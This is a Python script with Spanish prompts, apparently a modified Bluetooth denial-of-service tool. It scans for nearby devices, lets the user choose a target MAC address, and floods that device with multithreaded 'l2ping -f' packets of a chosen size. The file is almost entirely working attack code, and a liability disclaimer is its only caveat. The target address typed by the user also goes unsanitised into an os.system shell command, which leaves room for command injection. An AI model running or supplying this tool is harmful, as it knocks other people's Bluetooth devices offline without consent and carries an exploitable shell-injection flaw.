import os
import threading
import time
import subprocess

def DOS(target_addr, packages_size, retry_count=5):
    # Ejecuta un comando de ping Bluetooth con reintentos
    for attempt in range(retry_count):
        try:
            result = os.system(f'l2ping -i hci0 -s {packages_size} -f {target_addr}')
            if result == 0:
                print(f"[+] Respuesta recibida de {target_addr} en el intento {attempt + 1}")
                break
            else:
                print(f"[!] No se recibió respuesta de {target_addr} en el intento {attempt + 1}")
        except Exception as e:
            print(f"[!] ERROR en DOS: {str(e)}")
        time.sleep(1)  # Espera 1 segundo antes de reintentar

def printLogo():
    print('                            Script de DOS por Bluetooth - Modified @franckT                           ')

def check_bluetooth_tools():
    # Verifica si el comando hcitool está disponible
    try:
        subprocess.check_output("which hcitool", shell=True)
    except subprocess.CalledProcessError:
        print("[!] ERROR: 'hcitool' no está instalado o no está en el PATH.")
        return False
    return True

def activate_bluetooth():
    # Verifica y activa el Bluetooth si está bloqueado
    try:
        output = subprocess.check_output("rfkill list bluetooth", shell=True, text=True)
        if "Soft blocked: yes" in output or "Hard blocked: yes" in output:
            print("[*] Activando Bluetooth...")
            subprocess.check_call("rfkill unblock bluetooth", shell=True)
            time.sleep(2)  # Espera unos segundos para que el cambio surta efecto
    except subprocess.CalledProcessError as e:
        print(f"[!] ERROR: {str(e)}")
        return False
    return True

def check_bluetooth_device():
    try:
        output = subprocess.check_output("hciconfig", shell=True, text=True)
        if "hci0" not in output:
            print("[!] ERROR: No se detectó ningún dispositivo Bluetooth.")
            return False
        elif "DOWN" in output:
            print("[*] El dispositivo Bluetooth está abajo, intentando activarlo...")
            subprocess.check_call("hciconfig hci0 up", shell=True)
            time.sleep(2)  # Espera unos segundos para que el cambio surta efecto
    except subprocess.CalledProcessError as e:
        print(f"[!] ERROR: {str(e)}")
        return False
    return True

def main():
    if not check_bluetooth_tools():
        return

    if not activate_bluetooth():
        print("[!] No se pudo activar Bluetooth.")
        return

    if not check_bluetooth_device():
        print("[!] Asegúrate de que tu adaptador Bluetooth esté conectado y reconocido por el sistema.")
        return

    printLogo()
    time.sleep(0.1)
    print('')
    print('\x1b[31mESTE SOFTWARE SE PROPORCIONA "TAL CUAL" SIN GARANTÍA DE NINGÚN TIPO. USTED PUEDE USAR ESTE SOFTWARE BAJO SU PROPIO RIESGO. EL USO ES COMPLETA RESPONSABILIDAD DEL USUARIO FINAL. LOS DESARROLLADORES NO ASUMEN NINGUNA RESPONSABILIDAD Y NO SON RESPONSABLES POR NINGÚN USO INDEBIDO O DAÑO CAUSADO POR ESTE PROGRAMA.')
    if input("¿Estás de acuerdo? (y/n) > ").lower() == 'y':
        time.sleep(0.1)
        os.system('clear')
        printLogo()
        print('')
        print("Escaneando ...")

        try:
            output = subprocess.check_output("hcitool scan", shell=True, stderr=subprocess.STDOUT, text=True)
        except subprocess.CalledProcessError as e:
            print(f"[!] ERROR: {str(e)}")
            print("[!] Asegúrate de que tu interfaz Bluetooth está activada y tienes los permisos necesarios.")
            return
        
        lines = output.splitlines()
        if len(lines) < 2:
            print("[!] No se encontraron dispositivos")
            return

        del lines[0]  # Elimina la línea de encabezado
        devices = []
        
        print("|id   |   dirección_mac  |   nombre_dispositivo|")
        for id, line in enumerate(lines):
            parts = line.split('\t')
            if len(parts) == 2:
                mac, name = parts
                devices.append(mac)
                print(f"|{id: <4}|   {mac: <17}|   {name}")
        
        target_input = input('ID del objetivo o dirección MAC > ')
        try:
            target_addr = devices[int(target_input)]
        except (ValueError, IndexError):
            target_addr = target_input.strip()

        if not target_addr:
            print('[!] ERROR: Falta la dirección del objetivo')
            return

        try:
            packages_size = int(input('Tamaño de paquetes > '))
        except ValueError:
            print('[!] ERROR: El tamaño de los paquetes debe ser un número entero')
            return

        try:
            threads_count = int(input('Número de hilos > '))
        except ValueError:
            print('[!] ERROR: El número de hilos debe ser un número entero')
            return

        print('')
        os.system('clear')

        print("\x1b[31m[*] Iniciando ataque DOS en 3 segundos...")
        for i in range(3):
            print(f'[*] {3 - i}')
            time.sleep(1)

        os.system('clear')
        print('[*] Construyendo hilos...\n')

        for i in range(threads_count):
            print(f'[*] Hilo construido №{i + 1}')
            threading.Thread(target=DOS, args=(target_addr, packages_size)).start()

        print('[*] Todos los hilos construidos...')
        print('[*] Iniciando...')
    else:
        print('Abortado por el usuario')
        return

if __name__ == '__main__':
    try:
        os.system('clear')
        main()
    except KeyboardInterrupt:
        time.sleep(0.1)
        print('\n[*] Abortado')
    except Exception as e:
        time.sleep(0.1)
        print(f'[!] ERROR: {str(e)}')
